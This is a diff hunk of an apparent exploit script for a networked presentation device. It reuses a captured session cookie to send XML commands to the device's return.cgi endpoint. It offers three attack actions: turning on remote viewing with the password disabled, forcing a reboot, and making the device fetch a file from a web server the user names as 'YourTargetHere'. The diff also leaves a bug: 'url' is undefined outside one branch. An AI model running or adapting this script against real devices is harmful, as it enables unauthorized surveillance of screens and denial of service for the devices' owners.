@@ -43,12 +43,25 @@ cookieMid=cookieStart[1].split("'")
 cookie=cookieMid[0]
 print(cookie)
 
-#Turn Remove View Off
-url = "https://"+ host + "/cgi-bin/return.cgi"
-#data = {
-#    "command":"<Send><seid>"+ cookie +"</seid><name>SLIDES_ALWAYS_SEND</name><value>1</value><name>SLIDES_PASSWORD</name><value>0</value><name>SLIDES_SECOND</name><value>0</value></Send>"
-#}
-data = {
-    "command" :	"<Send><seid>" + cookie + "</seid><Factory>reboot</Factory></Send>"
-}
-remoteViewOn = requests.post(url=url,data=data, verify=False)
+action="Reboot"
+if action == "Remote":
+    #Turn Remove View Off
+    url = "https://"+ host + "/cgi-bin/return.cgi"
+    data = {
+        "command":"<Send><seid>"+ cookie +"</seid><name>SLIDES_ALWAYS_SEND</name><value>1</value><name>SLIDES_PASSWORD</name><value>0</value><name>SLIDES_SECOND</name><value>0</value></Send>"
+    }
+    remoteViewOn = requests.post(url=url,data=data, verify=False)
+    print("Remote View Active")
+elif action == "Reboot":
+    data = {
+        "command" :	"<Send><seid>" + cookie + "</seid><Factory>reboot</Factory></Send>"
+    }
+    remoteViewOn = requests.post(url=url,data=data, verify=False)
+    print("Reboot Incoming")
+elif action == "Web":
+    WebServer=YourTargetHere
+    data = {
+        "command"	:"<Send><seid>" + cookie + "</seid><upload><protocol>http</protocol><address>" + WebServer + "</address><logo>TheWeb.png</logo></upload></Send>"
+    }
+    remoteViewOn = requests.post(url=url,data=data, verify=False)
+    print("Web Request Sent")
